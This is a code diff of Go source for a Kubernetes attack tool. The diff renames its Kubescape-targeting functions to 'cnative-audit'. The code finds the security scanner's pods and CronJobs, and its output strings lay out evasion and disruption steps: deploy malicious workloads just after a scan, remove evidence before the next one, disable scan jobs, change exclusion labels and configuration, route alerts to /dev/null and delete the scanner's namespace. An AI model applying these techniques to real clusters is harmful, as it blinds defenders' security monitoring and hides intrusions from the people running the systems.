@@ -11,7 +11,7 @@ import (
 	"k8s.io/client-go/kubernetes"
 )
 
-func detectKubescape(ctx context.Context, client kubernetes.Interface) []DetectionSystem {
+func detectCnativeAudit(ctx context.Context, client kubernetes.Interface) []DetectionSystem {
 	namespaces := []string{"kubescape", "armo-system", "kube-system"}
 	for _, ns := range namespaces {
 		pods, err := client.CoreV1().Pods(ns).List(ctx, metav1.ListOptions{
@@ -19,10 +19,10 @@ func detectKubescape(ctx context.Context, client kubernetes.Interface) []Detecti
 		})
 		if err == nil && len(pods.Items) > 0 {
 			return []DetectionSystem{{
-				Name:      "kubescape",
+				Name:      "cnative-audit",
 				Detected:  true,
 				Namespace: ns,
-				Details:   fmt.Sprintf("%d kubescape pods", len(pods.Items)),
+				Details:   fmt.Sprintf("%d cnative-audit pods", len(pods.Items)),
 			}}
 		}
 
@@ -31,10 +31,10 @@ func detectKubescape(ctx context.Context, client kubernetes.Interface) []Detecti
 		})
 		if err == nil && len(pods.Items) > 0 {
 			return []DetectionSystem{{
-				Name:      "kubescape",
+				Name:      "cnative-audit",
 				Detected:  true,
 				Namespace: ns,
-				Details:   fmt.Sprintf("%d kubescape operator pods", len(pods.Items)),
+				Details:   fmt.Sprintf("%d cnative-audit operator pods", len(pods.Items)),
 			}}
 		}
 	}
@@ -44,7 +44,7 @@ func detectKubescape(ctx context.Context, client kubernetes.Interface) []Detecti
 		for _, cj := range cronjobs.Items {
 			if strings.Contains(cj.Name, "kubescape") {
 				return []DetectionSystem{{
-					Name:      "kubescape",
+					Name:      "cnative-audit",
 					Detected:  true,
 					Namespace: cj.Namespace,
 					Details:   fmt.Sprintf("scan CronJob: %s schedule=%s", cj.Name, cj.Spec.Schedule),
@@ -56,27 +56,27 @@ func detectKubescape(ctx context.Context, client kubernetes.Interface) []Detecti
 	return nil
 }
 
-// EvadeKubescape executes the specified Kubescape evasion technique.
-func EvadeKubescape(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface, technique string) (*EvasionResult, error) {
+// EvadeCnativeAudit executes the specified cnative-audit evasion technique.
+func EvadeCnativeAudit(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface, technique string) (*EvasionResult, error) {
 	switch technique {
 	case "scan_timing":
-		return kubescapeScanTiming(ctx, client)
+		return cnativeAuditScanTiming(ctx, client)
 	case "label_exclusion":
-		return kubescapeLabelExclusion(ctx, client, dynClient)
+		return cnativeAuditLabelExclusion(ctx, client, dynClient)
 	case "disable_scans":
-		return kubescapeDisableScans(ctx, client)
+		return cnativeAuditDisableScans(ctx, client)
 	case "config_modify":
-		return kubescapeConfigModify(ctx, client)
+		return cnativeAuditConfigModify(ctx, client)
 	default:
-		return kubescapeScanTiming(ctx, client)
+		return cnativeAuditScanTiming(ctx, client)
 	}
 }
 
-func kubescapeScanTiming(ctx context.Context, client kubernetes.Interface) (*EvasionResult, error) {
+func cnativeAuditScanTiming(ctx context.Context, client kubernetes.Interface) (*EvasionResult, error) {
 	var sb strings.Builder
-	sb.WriteString("Kubescape Scan Timing Analysis:\n\n")
+	sb.WriteString("cnative-audit Scan Timing Analysis:\n\n")
 
-	sb.WriteString("  Kubescape performs periodic posture scans (not real-time).\n")
+	sb.WriteString("  cnative-audit performs periodic posture scans (not real-time).\n")
 	sb.WriteString("  Operations between scans are invisible to posture checks.\n\n")
 
 	cronjobs, err := client.BatchV1().CronJobs("").List(ctx, metav1.ListOptions{})
@@ -108,7 +108,7 @@ func kubescapeScanTiming(ctx context.Context, client kubernetes.Interface) (*Eva
 	}
 
 	if !found {
-		sb.WriteString("  No Kubescape CronJobs found — may use in-cluster operator scheduling\n")
+		sb.WriteString("  No cnative-audit CronJobs found — may use in-cluster operator scheduling\n")
 		sb.WriteString("  Check for kubescape-scheduler deployment\n")
 	}
 
@@ -116,7 +116,7 @@ func kubescapeScanTiming(ctx context.Context, client kubernetes.Interface) (*Eva
 	sb.WriteString("    - Deploy malicious workloads immediately AFTER scan completes\n")
 	sb.WriteString("    - Remove evidence before next scan window\n")
 	sb.WriteString("    - Posture scans typically run every 4-24 hours\n")
-	sb.WriteString("    - Kubescape doesn't do runtime enforcement — only posture checks\n")
+	sb.WriteString("    - cnative-audit doesn't do runtime enforcement — only posture checks\n")
 	sb.WriteString("    - Modifications between scans are completely invisible\n")
 
 	return &EvasionResult{
@@ -126,11 +126,11 @@ func kubescapeScanTiming(ctx context.Context, client kubernetes.Interface) (*Eva
 	}, nil
 }
 
-func kubescapeLabelExclusion(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface) (*EvasionResult, error) {
+func cnativeAuditLabelExclusion(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface) (*EvasionResult, error) {
 	var sb strings.Builder
-	sb.WriteString("Kubescape Label Exclusion:\n\n")
+	sb.WriteString("cnative-audit Label Exclusion:\n\n")
 
-	sb.WriteString("  Kubescape uses namespace/label selectors for scan scope.\n")
+	sb.WriteString("  cnative-audit uses namespace/label selectors for scan scope.\n")
 	sb.WriteString("  Workloads with exclusion labels are skipped by the scanner.\n\n")
 
 	configMaps, err := client.CoreV1().ConfigMaps("").List(ctx, metav1.ListOptions{})
@@ -175,9 +175,9 @@ func kubescapeLabelExclusion(ctx context.Context, client kubernetes.Interface, d
 	}, nil
 }
 
-func kubescapeDisableScans(ctx context.Context, client kubernetes.Interface) (*EvasionResult, error) {
+func cnativeAuditDisableScans(ctx context.Context, client kubernetes.Interface) (*EvasionResult, error) {
 	var sb strings.Builder
-	sb.WriteString("Kubescape Scan Disable:\n\n")
+	sb.WriteString("cnative-audit Scan Disable:\n\n")
 
 	cronjobs, err := client.BatchV1().CronJobs("").List(ctx, metav1.ListOptions{})
 	if err != nil {
@@ -221,9 +221,9 @@ func kubescapeDisableScans(ctx context.Context, client kubernetes.Interface) (*E
 	}, nil
 }
 
-func kubescapeConfigModify(ctx context.Context, client kubernetes.Interface) (*EvasionResult, error) {
+func cnativeAuditConfigModify(ctx context.Context, client kubernetes.Interface) (*EvasionResult, error) {
 	var sb strings.Builder
-	sb.WriteString("Kubescape Configuration Modification:\n\n")
+	sb.WriteString("cnative-audit Configuration Modification:\n\n")
 
 	namespaces := []string{"kubescape", "armo-system", "kube-system"}
 	modified := false
@@ -260,7 +260,7 @@ func kubescapeConfigModify(ctx context.Context, client kubernetes.Interface) (*E
 	}
 
 	if !modified {
-		sb.WriteString("  No Kubescape ConfigMaps found\n")
+		sb.WriteString("  No cnative-audit ConfigMaps found\n")
 	}
 
 	sb.WriteString("\n  Configuration attack vectors:\n")
@@ -271,7 +271,7 @@ func kubescapeConfigModify(ctx context.Context, client kubernetes.Interface) (*E
 	sb.WriteString("    5. Modify alert destinations (send to /dev/null)\n")
 	sb.WriteString("    6. Set compliance frameworks to empty list\n\n")
 
-	sb.WriteString("  Impact: Kubescape will skip excluded resources entirely\n")
+	sb.WriteString("  Impact: cnative-audit will skip excluded resources entirely\n")
 	sb.WriteString("  No violation alerts, no compliance failures reported\n")
 
 	return &EvasionResult{
@@ -281,10 +281,10 @@ func kubescapeConfigModify(ctx context.Context, client kubernetes.Interface) (*E
 	}, nil
 }
 
-// DisruptKubescape identifies disruption vectors for Kubescape deployments.
-func DisruptKubescape(ctx context.Context, client kubernetes.Interface) (*EvasionResult, error) {
+// DisruptCnativeAudit identifies disruption vectors for cnative-audit deployments.
+func DisruptCnativeAudit(ctx context.Context, client kubernetes.Interface) (*EvasionResult, error) {
 	var sb strings.Builder
-	sb.WriteString("Kubescape Disruption:\n\n")
+	sb.WriteString("cnative-audit Disruption:\n\n")
 
 	namespaces := []string{"kubescape", "armo-system"}
 	found := false
@@ -305,7 +305,7 @@ func DisruptKubescape(ctx context.Context, client kubernetes.Interface) (*Evasio
 	}
 
 	if !found {
-		sb.WriteString("  No Kubescape deployments found\n")
+		sb.WriteString("  No cnative-audit deployments found\n")
 	}
 
 	sb.WriteString("\n  Disruption techniques:\n")
@@ -318,7 +318,7 @@ func DisruptKubescape(ctx context.Context, client kubernetes.Interface) (*Evasio
 	sb.WriteString("    - Delete kubescape namespace entirely\n")
 
 	return &EvasionResult{
-		Technique: "disrupt_kubescape",
+		Technique: "disrupt_cnative_audit",
 		Success:   found,
 		Output:    sb.String(),
 	}, nil
